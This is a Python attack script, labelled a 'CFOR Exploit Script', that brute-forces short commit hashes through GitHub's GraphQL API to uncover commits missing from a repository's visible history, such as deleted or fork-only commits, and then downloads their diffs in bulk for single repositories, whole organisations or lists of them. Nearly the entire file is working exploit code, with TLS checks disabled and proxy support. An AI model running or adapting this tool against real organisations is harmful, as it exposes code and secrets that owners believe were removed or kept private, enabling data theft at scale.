#!/bin/python
import requests
import time
import os
from itertools import product
import sys
import queue
from threading import Thread
from config import gh_token, num_threads, batch_size, proxies
import urllib3
import argparse
urllib3.disable_warnings()

headers = {"Authorization": f"Bearer {gh_token}"}

def make_graphql_query(list_of_ids, repo_name, repo_owner):
	list_of_ids = list(list_of_ids)
	query = 'query {repository(owner:"'+repo_owner+'",name:"'+repo_name+'"){'
	for i in range(len(list_of_ids)):
		query+='a'+str(i)+':object(expression:"'+list_of_ids[i]+'"){... on Commit {oid}}'
	query+='}}'
	return query

def test_list_of_short_sha(list_of_short_sha, repo_name, repo_owner, sleep_val=10):
	query = make_graphql_query(list_of_short_sha, repo_name, repo_owner)
	try:
		r = requests.post('https://api.github.com/graphql', headers=headers, json={"query":query}, proxies=proxies, verify=False)
	except Exception as e:
		print(f"Exception: {e}")
		return test_list_of_short_sha(list_of_short_sha, repo_name, repo_owner, sleep_val+2)
	found_ids = []
	if r.headers['Content-Type'].startswith('application/json'):
		if 'data' in r.json():
			if r.json()['data'] is None:
				if not r.json().get('errors',[{}])[0].get('message','').startswith("Something went wrong while executing your query"):
					print(f"Query: {query}")
					print(r.json())
				print(f"JSON error page, retrying in {sleep_val} seconds")
				time.sleep(sleep_val)
				return test_list_of_short_sha(list_of_short_sha, repo_name, repo_owner, sleep_val+2)
			for x in r.json()['data']['repository'].values():
				if x:
					found_ids.append(x['oid'])
			return found_ids
		else:
			if 'message' in r.json() and r.json()['message'].startswith("You have exceeded a secondary rate limit"):
				print(f"Hit secondary rate limit retrying in {sleep_val} seconds")
			elif r.json().get('errors',[{}])[0].get('message','').startswith("Parse error"):
				print('Parse error, moving on')
				return found_ids
			else:
				print(r.json())
				print(f"No data key in JSON? retrying in {sleep_val} seconds")
			time.sleep(sleep_val)
			return test_list_of_short_sha(list_of_short_sha, repo_name, repo_owner, sleep_val+2)
	print(f"HTML error page, retrying in {sleep_val} seconds")
	time.sleep(sleep_val)
	return test_list_of_short_sha(list_of_short_sha, repo_name, repo_owner, sleep_val+2)

# TODO this could be expanded to get commits from forks
def get_all_known_commits(repo_name, repo_owner):
	known_commits = set()
	print("Getting known commits")
	url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/commits?per_page=100'
	while True:
		r = requests.get(url, headers=headers, proxies=proxies, verify=False)
		json = r.json()
		for x in json:
			known_commits.add(x["sha"])
		if 'link' not in r.headers or "next" not in r.headers['link']:
			break
		else:
			url = r.headers['link'].split('>; rel="next"')[0].split('<')[1]
			url = f"{url}&per_page=100"
	print(f"There are {len(known_commits)} known commits")
	return known_commits

def worker(commit_q, found_q, repo_name, repo_owner):
	while True:
		try:
			job_item = commit_q.get_nowait()
			found_commits = test_list_of_short_sha(job_item, repo_name, repo_owner)
			for x in found_commits:
				found_q.put(x)
				print(f"https://github.com/{repo_owner}/{repo_name}/commit/{x}")
			commit_q.task_done()
		except queue.Empty:
			return

def get_commit_diff(repo_name, repo_owner, commit_id, found_q):
	try:
		response = requests.get(f"https://github.com/{repo_owner}/{repo_name}/commit/{commit_id}.diff")
	except Exception as e:
		print(f"Exception: {e}")
		return False
	if response.status_code == 200:
		with open(f"output/{repo_owner}_{repo_name}/{commit_id}.diff", "wb") as f:
			f.write(response.content)
		return True
	elif response.text.startswith("Content containing PDF or PS header bytes") or response.text.startswith("error: too big or took too long to generate"):
		# TODO handle these better example url: https://github.com/snowflakedb/gosnowflake/commit/216db9e361d367931d5563d6e43dd4b2ab10a22d.diff
		print(f"Couldn't get diff for https://github.com/{repo_owner}/{repo_name}/commit/{commit_id}")
		return True
	else:
		print(f"Error downloading https://github.com/{repo_owner}/{repo_name}/commit/{commit_id}.diff adding it back to queue (current size: {found_q.qsize()})")
		return False

def get_commit_patch(repo_name, repo_owner, commit_id, found_q):
	try:
		response = requests.get(f"https://github.com/{repo_owner}/{repo_name}/commit/{commit_id}.patch")
	except Exception as e:
		print(f"Exception: {e}")
		return False
	if response.status_code == 200:
		with open(f"output/{repo_owner}_{repo_name}/{commit_id}.patch", "wb") as f:
			f.write(response.content)
		return True
	elif response.text.startswith("Content containing PDF or PS header bytes") or response.text.startswith("error: too big or took too long to generate"):
		# TODO handle these better example url: https://github.com/snowflakedb/gosnowflake/commit/216db9e361d367931d5563d6e43dd4b2ab10a22d.diff
		print(f"Couldn't get patch for https://github.com/{repo_owner}/{repo_name}/commit/{commit_id}")
		return True
	elif "This page is taking too long to load." in response.text:
		print(f"Skipping https://github.com/{repo_owner}/{repo_name}/commit/{commit_id} as it takes too long to load (error page)")
		return True
	else:
		print(f"Error downloading https://github.com/{repo_owner}/{repo_name}/commit/{commit_id}.patch adding it back to queue (current size: {found_q.qsize()})")
		return False

def worker2(found_q, repo_name, repo_owner):
	sleep_val = 2
	while True:
		try:
			job_item = found_q.get_nowait()
			if get_commit_diff(repo_name, repo_owner, job_item, found_q):
				found_q.task_done()
				if sleep_val > 2:
					sleep_val-=2
			else:
				time.sleep(sleep_val)
				if get_commit_patch(repo_name, repo_owner, job_item, found_q):
					found_q.task_done()
					if sleep_val > 2:
						sleep_val-=2
				else:
					found_q.task_done()
					found_q.put(job_item)
					time.sleep(sleep_val)
					sleep_val+=2
		except queue.Empty:
			return

def populate_q(commit_q, known_commits):
	chars = "0123456789abcdef"
	batch = []
	for commit_short in product(chars, repeat=4):
		commit_short = ''.join(commit_short)
		collision = False
		for known in known_commits:
			if known.startswith(commit_short):
				collision = True
				for x in chars:
					new_commit_short = f"{commit_short}{x}"
					if not known.startswith(new_commit_short):
						batch.append(new_commit_short)
				break
		if not collision:
			batch.append(commit_short)
		
		if len(batch)>batch_size:
			commit_q.put(batch)
			batch = []
	if len(batch) > 0:
		commit_q.put(batch)

def make_folder(repo_owner, repo_name):
	current_directory = os.getcwd()
	final_directory = os.path.join(current_directory, f'output/{repo_owner}_{repo_name}')
	if not os.path.exists(final_directory):
		os.makedirs(final_directory)

def main(repo_owner, repo_name):
	known_commits = get_all_known_commits(repo_name, repo_owner)
	commit_q = queue.Queue(maxsize=0)
	found_q = queue.Queue(maxsize=0)
	populate_q(commit_q, known_commits)
	print(f"Making {commit_q.qsize()} graphql queries")
	for _ in range(num_threads):
		t = Thread(target=worker, args=(commit_q, found_q, repo_name, repo_owner))
		t.daemon = True
		t.start()
	commit_q.join()

	# I just uncomment this for when the graphql queries hangs
	# found_q = queue.Queue(maxsize=0)
	# with open('sad.txt') as f:
	# 	for line in f:
	# 		found_q.put(line.rstrip())

	print(f"Found {found_q.qsize()} commit ids, downloading diffs into {repo_owner}_{repo_name} folder")
	make_folder(repo_owner, repo_name)
	for _ in range(num_threads):
		t = Thread(target=worker2, args=(found_q, repo_name, repo_owner))
		t.daemon = True
		t.start()
	found_q.join()
	print("Finished successfully")

def get_repos_for_org(org_name):
	repos = set()
	print(f"Getting repos for {org_name}")
	url = f'https://api.github.com/users/{org_name}/repos?per_page=100'
	while True:
		r = requests.get(url, headers=headers, proxies=proxies, verify=False)
		json = r.json()
		for x in json:
			repos.add(x["name"])
		if 'link' not in r.headers or "next" not in r.headers['link']:
			break
		else:
			url = r.headers['link'].split('>; rel="next"')[0].split('<')[-1]
			url = f"{url}&per_page=100"
	print(f"There are {len(repos)} repos")
	return repos

def scan_org(org_name):
	repo_list = get_repos_for_org(org_name)
	for repo in repo_list:
		main(org_name, repo)
	print(f"Finished scanning {org_name} org")

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="CFOR Exploit Script")
	parser.add_argument("--target", "-t", help="Target Repo (e.g., https://github.com/user/reponame)")
	parser.add_argument("--org", "-o", help="Target org or user")
	parser.add_argument("--list", "-l", help="List of target orgs or users")
	args = parser.parse_args()

	if args.target:
		url = args.target.split("://")[1].split('/')
		repo_owner = url[1]
		repo_name = url[2]
		main(repo_owner, repo_name)
	elif args.list:
		orgs_list = set()
		with open(args.list) as f:
			for line in f:
				line = line.strip()
				if "github.com/" in line:
					line = line.split("github.com/")[1]
				line = line.split("/")[0]
				line = line.replace('"','')
				orgs_list.add(line)
		print(f"Scanning {len(orgs_list)} orgs/users")
		for org in orgs_list:
			scan_org(org)
	elif args.org:
		scan_org(args.org)
	else:
		parser.print_help(sys.stderr)